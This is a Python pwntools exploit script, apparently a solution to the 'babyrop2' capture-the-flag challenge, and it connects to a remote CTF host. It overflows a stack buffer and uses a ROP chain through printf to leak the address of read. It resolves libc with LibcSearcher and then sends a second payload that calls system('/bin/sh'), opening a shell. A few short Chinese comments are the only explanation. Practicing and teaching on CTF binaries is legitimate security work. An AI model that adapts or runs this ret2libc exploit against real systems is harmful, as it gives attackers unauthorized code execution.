from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'


if args.LOCAL:
    p = process("./babyrop2")
else:
    p = remote("node3.buuoj.cn", 26667)

# 使用printf泄露地址

e = ELF("babyrop2")

sFormatAddr = 0x600790  # "%s!\n"
printfAddr  = e.plt["printf"]
readAddr    = e.got["read"]
mainAddr    = 0x400636

pop_rdi     = 0x400733  # 0x0000000000400733 : pop rdi ; ret
pop_rsi     = 0x400731  # 0x0000000000400731 : pop rsi ; pop r15 ; ret

payload = b'a'*(0x20+8)+p64(pop_rdi)+p64(sFormatAddr)+p64(pop_rsi)+p64(readAddr)+p64(0)
payload += p64(printfAddr) + p64(mainAddr)

p.sendlineafter('name? ', payload)

p.recvuntil("aaa!\n")

# 注意：这里的ljust是必要的，因为u64()必须要8字节长度的输入
readRealAddr = u64(p.recvuntil("What's your name? ", drop=True)[:-2].ljust(8, b'\x00'))

log.info(hex(readRealAddr))

libc = LibcSearcher("read", readRealAddr)
offset = readRealAddr - libc.dump("read")

systemAddr = libc.dump("system") + offset
binShAddr  = libc.dump("str_bin_sh") + offset

payload2 = b'a'*(0x20+8)+p64(pop_rdi)+p64(binShAddr)+p64(systemAddr)

p.sendline(payload2)

p.interactive()